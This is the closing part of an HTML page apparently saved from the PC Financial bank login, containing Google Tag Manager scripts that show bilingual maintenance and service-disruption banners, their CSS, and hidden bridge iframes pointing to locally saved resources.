          a = !1; for (f = 0; f < c[b].conditions[e].value.length; f++)a = a || google_tag_manager["rm"]["9139982"](618) == "/" + google_tag_manager["rm"]["9139982"](619) +
            c[b].conditions[e].value[f]; g = g && a
        } else if ("account_type" == c[b].conditions[e].field) { a = !1; for (f = 0; f < c[b].conditions[e].value.length; f++)switch (c[b].conditions[e].value[f]) { case "credit-card": a = a || google_tag_manager["rm"]["9139982"](621); break; case "individual": a = a || google_tag_manager["rm"]["9139982"](623); break; case "joint": a = a || google_tag_manager["rm"]["9139982"](625); break; case "additional": a = a || google_tag_manager["rm"]["9139982"](627); break; case "credit-individual": a = a || google_tag_manager["rm"]["9139982"](629) }g = g && a } g && (k = !0, h = c[b].message[google_tag_manager["rm"]["9139982"](630)])
      } var d = document.getElementById("gtm_important-message");
      d && d.classList.remove("js-show"); k && (d ? d.innerHTML = "\x3cp\x3e\x3cspan class\x3d'title'\x3e\x3c/span\x3e " + h + "\x3c/p\x3e\x3ca class\x3d'close'\x3e\x26times;\x3c/a\x3e" : (d = document.createElement("div"), d.id = "gtm_important-message", d.className = "important-message", d.innerHTML = "\x3cp\x3e\x3cspan class\x3d'title'\x3e\x3c/span\x3e " + h + "\x3c/p\x3e\x3ca class\x3d'close'\x3e\x26times;\x3c/a\x3e", d.onclick = function (l) { l.target.classList.contains("close") && d.classList.remove("js-show") }, document.getElementsByTagName("body")[0].appendChild(d)),
        setTimeout(function () { d.classList.add("js-show") }, 1E3))
    })();</script>
  <style>
    .important-message {
      position: fixed;
      z-index: 999999;
      width: 100%;
      top: 0;
      left: 0;
      padding: 0 1em;
      display: flex;
      align-items: center;
      color: white;
      background-color: #00a0ad;
      font-family: "Averta-Regular", sans-serif;
      transition: transform 300ms ease-out;
      transform: translateY(-100%);
      verticle-align: middle;
      text-align: center;
      align-items: center;
      justify-content: center;
    }

    .important-message a {
      color: #fff;
    }

    .important-message.js-show {
      transform: translateY(0);
    }

    .important-message p {
      margin: 3px 3px 3px 3px;
      color: inherit;
      text-align: center;
      flex: 1 1 auto;
      width: 100%;
    }

    /*.important-message .title::before {
  width: 1em;
  height: 1em;
  margin-right: .5em;
  display: inline-block;
  content: "";
  background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDcgMTA3Ij48cGF0aCBkPSJNNTMuNyA3MS42Yy00LjIgMC03LjcgMy40LTcuNyA3LjdzMy40IDcuNyA3LjcgNy43IDcuNy0zLjQgNy43LTcuNy0zLjUtNy43LTcuNy03LjdtMC01MS4xYy00LjIgMC03LjcgMy40LTcuNyA3Ljd2MzAuN2MwIDQuMiAzLjQgNy43IDcuNyA3LjdzNy43LTMuNCA3LjctNy43VjI4LjFjMC00LjItMy41LTcuNi03LjctNy42bTAgODYuOUMyNCAxMDcuNCAwIDgzLjQgMCA1My43UzI0IDAgNTMuNyAwczUzLjcgMjQgNTMuNyA1My43LTI0IDUzLjctNTMuNyA1My43IiBmaWxsLXJ1bGU9ImV2ZW5vZGQiIGNsaXAtcnVsZT0iZXZlbm9kZCIgZmlsbD0iI2ZmZiIvPjwvc3ZnPg==');
  background-size: contain;
}*/
    .important-message .close {
      padding: 0 1em;
      margin-right: 1em;
      flex: 0 1 auto;
      color: inherit;
    }
  </style>
  <script type="text/javascript" id="">(function () {
      for (var c = [{ active: !1, message: { en: "Our Identity Verification process is currently unavailable, please re-visit this link at a later time.", fr: "Notre m\u00e9canisme de v\u00e9rification de l'identit\u00e9 est actuellement indisponible. Veuillez r\u00e9essayer ult\u00e9rieurement depuis ce lien." }, conditions: [{ field: "phx_page", value: ["applyprocessing:onfido:email:start now"] }] }, {
        active: !1, message: {
          en: "We are currently performing maintenance on our site and Enrollment \x26 Profile Update functionalities are temporarily unavailable. Please try again later. We apologize for this inconvenience. Thank you for your patience.",
          fr: "Nous effectuons actuellement une maintenance sur notre site et les fonctionnalit\u00e9s d'inscription et de mise \u00e0 jour du profil sont temporairement indisponibles. Veuillez r\u00e9essayer plus tard. Nous nous excusons pour ce d\u00e9sagr\u00e9ment. Merci pour votre patience."
        }, conditions: [{ field: "phx_page", value: ["digital-verification"] }]
      }, {
        active: !1, message: { en: "Our Identity Verification process is currently unavailable, please re-visit this link at a later time.", fr: "Notre m\u00e9canisme de v\u00e9rification de l'identit\u00e9 est actuellement indisponible. Veuillez r\u00e9essayer ult\u00e9rieurement depuis ce lien." },
        conditions: [{ field: "phx_page", value: ["dashboard"] }]
      }, {
        active: !1, message: { en: "We\u2019re currently experiencing a service disruption for those trying to activate or update their balance and spending alerts. We\u2019re sorry for the inconvenience and are working hard to fix this.", fr: "Nous \u00e9prouvons des probl\u00e8mes d\u2019interruption de service pour ceux qui essayent d'activ\u00e9 our changer les notifications de solde et d\u00e9penses. Nous sommes d\u00e9sol\u00e9s des inconv\u00e9nients occasionn\u00e9s par cette situation et travaillons \u00e0 r\u00e9soudre le probl\u00e8me." },
        conditions: [{ field: "phx_page", value: ["applications"] }]
      }, {
        active: !1, message: { en: "We are currently experiencing a service disruption for those trying to register for online banking, access e-statements, activate a card or manage a PIN. We are working to resolve these issues quickly and apologize for any inconvenience. Thank you for your patience.", fr: "Nous \u00e9prouvons actuellement certains probl\u00e8mes techniques qui touchent les inscriptions aux services bancaires en ligne, \u00e0 l\u2019acc\u00e8s aux relev\u00e9s \u00e9lectroniques, \u00e0 l\u2019activation de carte ou \u00e0 la gestion de NIP. Nous nous effor\u00e7ons de rem\u00e9dier \u00e0 cette situation le plus rapidement possible et nous excusons pour tout inconv\u00e9nient r\u00e9sultant de cette situation. Nous vous remercions de votre patience." },
        conditions: [{ field: "account_type", value: ["credit-card"] }, { field: "phx_page", value: ["accountsoverview"] }]
      }, {
        active: !1, message: { en: "Due to scheduled maintenance, your changes to alert preferences may not be saved. Sorry for the inconvenience.", fr: "En raison de la maintenance planifi\u00e9e du syst\u00e8me, les changements effectu\u00e9s aux pr\u00e9f\u00e9rences concernant les alertes ne puissent pas \u00eatre sauvegard\u00e9s. Nous sommes d\u00e9sol\u00e9s pour tout inconv\u00e9nients." }, conditions: [{
          field: "phx_page",
          value: ["notificationprefs"]
        }]
      }, {
        active: !1, message: { en: "We\u2019re currently performing maintenance on our site. Add/Modify a payee functionality would be temporarily unavailable. Please try again or contact our support. We\u2019re sorry for the inconvenience.", fr: "Nous effectuons actuellement des op\u00e9rations de maintenance sur notre site. Ajouter / modifier une fonctionnalit\u00e9 de b\u00e9n\u00e9ficiaire serait temporairement indisponible. Veuillez r\u00e9essayer ou contacter notre support. Nous sommes d\u00e9sol\u00e9s pour la g\u00eane occasionn\u00e9e." },
        conditions: [{ field: "phx_page", value: ["selectpayee", "dashboard"] }]
      }, {
        active: !1, message: { en: "We are currently performing maintenance on our site and Card Management functionalities are temporarily unavailable. Please try again later. We apologize for this inconvenience. Thank you for your patience.", fr: "En raison de travaux de maintenance de notre site, le service de gestion de carte est temporairement indisponible. Veuillez r\u00e9essayer plus tard. Nous sommes d\u00e9sol\u00e9s des inconv\u00e9nients que cette situation pourrait causer. Nous vous remercions de votre patience." },
        conditions: [{ field: "phx_page", value: ["cardsoverview"] }]
      }, {
        active: !1, message: { en: "We are currently performing maintenance on our site and Interac e-Transfers\u00ae services are temporarily unavailable. Please try again later. We apologize for this inconvenience. Thank you for your patience.", fr: "En raison de travaux de maintenance, notre site, le service de Virement InteracMD est temporairement indisponible. Veuillez r\u00e9essayer plus tard. Nous sommes d\u00e9sol\u00e9s des inconv\u00e9nients que cette situation pourrait causer. Nous vous remercions de votre patience." },
        conditions: [{ field: "phx_page", value: ["interac"] }]
      }, {
        active: !1, message: { en: "We\u2019re currently performing maintenance on our site and card management functionalities would be temporarily unavailable. Please try again or contact our support. We\u2019re sorry for the inconvenience.", fr: "Nous effectuons actuellement une maintenance sur notre site et les fonctionnalit\u00e9s de gestion des cartes seraient temporairement indisponibles. Veuillez r\u00e9essayer ou contacter notre support. Nous sommes d\u00e9sol\u00e9s pour le d\u00e9sagr\u00e9ment." },
        conditions: [{ field: "phx_page", value: ["cardsoverview"] }]
      }, {
        active: !1, message: { en: "We\u2019re currently performing maintenance on our site and profile update functionalities would be temporarily unavailable. Please try again or contact our support. We\u2019re sorry for the inconvenience.", fr: "Nous effectuons actuellement des op\u00e9rations de maintenance sur notre site et la fonctionnalit\u00e9 de mise \u00e0 jour de profil serait temporairement indisponible. Veuillez r\u00e9essayer ou contacter notre support. Nous sommes d\u00e9sol\u00e9s du d\u00e9rangement." },
        conditions: [{ field: "phx_page", value: ["customeroverview"] }]
      }, {
        active: !1, message: { en: 'A fast way to fund your new PC Money\u2122 Account is by requesting an \x3ca href\x3d"https://secure.pcfinancial.ca/en/my/dashboard(transfer:email/request)"\x3eInterac e-Transfer\u00ae\x3c/a\x3e. Try it today!', fr: 'Un moyen d\u2019approvisionner rapidement votre compte PC ArgentMC est de demander un Virement \x3ca href\x3d"https://secure.pcfinancial.ca/fr/my/dashboard(transfer:email/request)"\x3eInteracMD\x3c/a\x3e. Essayez-le d\u00e8s aujourd\u2019hui!' },
        conditions: [{ field: "account_type", value: ["credit-individual", "individual"] }, { field: "phx_page", value: ["dashboard"] }]
      }], h = "", k = !1, b = 0; b < c.length; b++)if (c[b].active) {
        for (var g = !0, e = 0; e < c[b].conditions.length; e++)if ("phx_page" == c[b].conditions[e].field) { for (var a = !1, f = 0; f < c[b].conditions[e].value.length; f++)a = a || google_tag_manager["rm"]["9139982"](631) == c[b].conditions[e].value[f]; g = g && a } else if ("phx_path" == c[b].conditions[e].field) {
          a = !1; for (f = 0; f < c[b].conditions[e].value.length; f++)a = a || google_tag_manager["rm"]["9139982"](635) == "/" + google_tag_manager["rm"]["9139982"](636) +
            c[b].conditions[e].value[f]; g = g && a
        } else if ("account_type" == c[b].conditions[e].field) { a = !1; for (f = 0; f < c[b].conditions[e].value.length; f++)switch (c[b].conditions[e].value[f]) { case "credit-card": a = a || google_tag_manager["rm"]["9139982"](638); break; case "individual": a = a || google_tag_manager["rm"]["9139982"](640); break; case "joint": a = a || google_tag_manager["rm"]["9139982"](642); break; case "additional": a = a || google_tag_manager["rm"]["9139982"](644); break; case "credit-individual": a = a || google_tag_manager["rm"]["9139982"](646) }g = g && a } g && (k = !0, h = c[b].message[google_tag_manager["rm"]["9139982"](647)])
      } var d = document.getElementById("gtm_important-message");
      d && d.classList.remove("js-show"); k && (d ? d.innerHTML = "\x3cp\x3e\x3cspan class\x3d'title'\x3e\x3c/span\x3e " + h + "\x3c/p\x3e\x3ca class\x3d'close'\x3e\x26times;\x3c/a\x3e" : (d = document.createElement("div"), d.id = "gtm_important-message", d.className = "important-message", d.innerHTML = "\x3cp\x3e\x3cspan class\x3d'title'\x3e\x3c/span\x3e " + h + "\x3c/p\x3e\x3ca class\x3d'close'\x3e\x26times;\x3c/a\x3e", d.onclick = function (l) { l.target.classList.contains("close") && d.classList.remove("js-show") }, document.getElementsByTagName("body")[0].appendChild(d)),
        setTimeout(function () { d.classList.add("js-show") }, 1E3))
    })();</script>
  <style>
    .important-message {
      position: fixed;
      z-index: 999999;
      width: 100%;
      top: 0;
      left: 0;
      padding: 0 1em;
      display: flex;
      align-items: center;
      color: white;
      background-color: #00a0ad;
      font-family: "Averta-Regular", sans-serif;
      transition: transform 300ms ease-out;
      transform: translateY(-100%);
      verticle-align: middle;
      text-align: center;
      align-items: center;
      justify-content: center;
    }

    .important-message a {
      color: #fff;
    }

    .important-message.js-show {
      transform: translateY(0);
    }

    .important-message p {
      margin: 3px 3px 3px 3px;
      color: inherit;
      text-align: center;
      flex: 1 1 auto;
      width: 100%;
    }

    /*.important-message .title::before {
  width: 1em;
  height: 1em;
  margin-right: .5em;
  display: inline-block;
  content: "";
  background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDcgMTA3Ij48cGF0aCBkPSJNNTMuNyA3MS42Yy00LjIgMC03LjcgMy40LTcuNyA3LjdzMy40IDcuNyA3LjcgNy43IDcuNy0zLjQgNy43LTcuNy0zLjUtNy43LTcuNy03LjdtMC01MS4xYy00LjIgMC03LjcgMy40LTcuNyA3Ljd2MzAuN2MwIDQuMiAzLjQgNy43IDcuNyA3LjdzNy43LTMuNCA3LjctNy43VjI4LjFjMC00LjItMy41LTcuNi03LjctNy42bTAgODYuOUMyNCAxMDcuNCAwIDgzLjQgMCA1My43UzI0IDAgNTMuNyAwczUzLjcgMjQgNTMuNyA1My43LTI0IDUzLjctNTMuNyA1My43IiBmaWxsLXJ1bGU9ImV2ZW5vZGQiIGNsaXAtcnVsZT0iZXZlbm9kZCIgZmlsbD0iI2ZmZiIvPjwvc3ZnPg==');
  background-size: contain;
}*/
    .important-message .close {
      padding: 0 1em;
      margin-right: 1em;
      flex: 0 1 auto;
      color: inherit;
    }
  </style>
</body><iframe id="__JSBridgeIframe_1.0__" title="jsbridge___JSBridgeIframe_1.0__" style="display: none;"
  src="./Login _ PC Financial_files/saved_resource.html"></iframe><iframe id="__JSBridgeIframe_SetResult_1.0__"
  title="jsbridge___JSBridgeIframe_SetResult_1.0__" style="display: none;"
  src="./Login _ PC Financial_files/saved_resource(1).html"></iframe><iframe id="__JSBridgeIframe__"
  title="jsbridge___JSBridgeIframe__" style="display: none;"
  src="./Login _ PC Financial_files/saved_resource(2).html"></iframe><iframe id="__JSBridgeIframe_SetResult__"
  title="jsbridge___JSBridgeIframe_SetResult__" style="display: none;"
  src="./Login _ PC Financial_files/saved_resource(3).html"></iframe>

</html>